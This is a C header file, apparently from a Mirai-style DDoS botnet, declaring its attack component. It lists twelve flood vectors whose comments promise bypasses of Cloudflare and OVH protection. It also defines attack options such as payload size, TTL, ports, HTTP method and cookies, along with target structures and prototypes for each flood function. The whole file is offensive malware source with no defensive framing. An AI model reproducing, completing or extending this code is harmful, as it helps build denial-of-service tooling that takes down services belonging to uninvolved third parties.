#ifndef _ATTACK_H
#define _ATTACK_H

#include "includes.h"

/* ============================================================================
 * ATTACK VECTORS - Optimized methods
 * ============================================================================ */
#define ATK_VEC_TCP         0   /* TCP flood optimized for Gbps */
#define ATK_VEC_UDP         1   /* UDP flood optimized for Gbps */
#define ATK_VEC_HTTP        2   /* HTTP flood optimized for RPS */
#define ATK_VEC_AXISL7      3   /* Browser emulation + HTTPS + CF bypass */
#define ATK_VEC_OVHTCP      4   /* TCP with OVH bypass */
#define ATK_VEC_OVHUDP      5   /* UDP with OVH bypass */
#define ATK_VEC_ICMP        6   /* ICMP ping flood */
#define ATK_VEC_AXISL4      7   /* Combined OVHTCP + OVHUDP + ICMP */
#define ATK_VEC_GREIP       8   /* GRE IP flood */
#define ATK_VEC_GREETH      9   /* GRE Ethernet flood */
#define ATK_VEC_ULTIMATE    10  /* ULTIMATE L7 - Advanced multi-layer bypass */
#define ATK_VEC_ULTIMATEL4  11  /* ULTIMATE L4 - Combined volumetric + bypass */

#define ATK_VEC_MAX         12

/* ============================================================================
 * ATTACK OPTIONS
 * ============================================================================ */
#define ATK_OPT_PAYLOAD_SIZE    0
#define ATK_OPT_PAYLOAD_RAND    1
#define ATK_OPT_IP_TOS          2
#define ATK_OPT_IP_IDENT        3
#define ATK_OPT_IP_TTL          4
#define ATK_OPT_IP_DF           5
#define ATK_OPT_SPORT           6
#define ATK_OPT_DPORT           7
#define ATK_OPT_DOMAIN          8
#define ATK_OPT_HTTP_METHOD     9
#define ATK_OPT_HTTP_POST_DATA  10
#define ATK_OPT_HTTP_PATH       11
#define ATK_OPT_CONNS           12
#define ATK_OPT_SOURCE          13
#define ATK_OPT_URL             14
#define ATK_OPT_HTTPS           15
#define ATK_OPT_USERAGENT       16
#define ATK_OPT_COOKIES         17
#define ATK_OPT_REFERER         18

/* ============================================================================
 * ATTACK STRUCTURES
 * ============================================================================ */
struct attack_target {
    struct in_addr addr;
    uint8_t netmask;
};

struct attack_option {
    uint8_t key;
    char *val;
};

struct attack_method {
    void (*func)(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
    uint8_t type;
};

/* ============================================================================
 * FUNCTION PROTOTYPES
 * ============================================================================ */
void attack_init(void);
void attack_kill_all(void);
void attack_parse(char *, int);
void attack_start(int, uint8_t, int, struct attack_target *, struct attack_option *);
char *attack_get_opt_str(int, struct attack_option *, int, uint8_t);
int attack_get_opt_int(int, struct attack_option *, int, uint8_t);
uint32_t attack_get_opt_ip(int, struct attack_option *, int, uint8_t);

/* Attack method declarations */
static void attack_tcp_gbps(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_udp_gbps(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_http_rps(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_axis_l7(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_ultimate_l7(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_ultimate_l4(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_ovh_tcp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_ovh_udp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_icmp(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_axis_l4(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_gre_ip(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
static void attack_gre_eth(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);

#endif
